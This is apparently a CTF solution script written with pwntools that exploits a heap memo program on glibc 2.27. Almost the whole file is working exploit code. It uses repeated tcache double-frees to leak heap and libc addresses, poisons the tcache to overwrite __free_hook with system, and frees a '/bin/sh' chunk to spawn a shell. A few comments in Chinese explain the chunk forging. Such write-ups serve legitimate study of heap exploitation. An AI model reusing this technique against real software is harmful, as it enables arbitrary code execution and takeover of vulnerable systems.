from pwn import *
import sys, os
context.log_level = 'debug'
prog = './one'
elf = ELF(prog)
p = process(prog)
os.system("patchelf --set-interpreter ./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so "+prog)
os.system("patchelf --set-rpath ./glibc-all-in-one/libs/2.27-3ubuntu1_amd64 "+prog)
libc = ELF("./libc-2.27.so")
#p = remote("")
def dbg():
    gdb.attach(p)
    p.interactive()

def add(content):
	p.sendlineafter("> ", p64(0x31)+p64(0x81))
	p.sendlineafter("Input memo > ", content)
def show():
	p.sendlineafter("> ", '2')
def free():
	p.sendlineafter("> ", '3')

def exp():
	add('a')
	free()
	free()
	free()
	free()
	show()
	heap_leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
	log.info('Heap leak: ' + hex(heap_leak))
	add(p64(0))									#将tcache chunk->fd  == > 0x0 使得下下次申请的chunk不在tcache数组
	add((p64(heap_leak+0x50)+p64(0x91))*2)		#准备伪造一个0x90的chunk
	add('a')
	add('a')
	add('a')
	free()
	free()
	free()
	add(p64(heap_leak+0x10))					
	add('a')		
	add('a')									#申请到unsorted chunk	
	for i in range(8):
		free()
	show()
	leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
	libc.address = leak - 0x3ebca0 # Offset found using gdb
	free_hook = libc.symbols['__free_hook']
	system = libc.symbols['system']
	add('a')	
	free()
	free()
	add(p64(free_hook))
	add('a')
	add(p64(system))
	add('/bin/sh\x00')
	free()	
	p.interactive()

if __name__ == '__main__':
	exp()
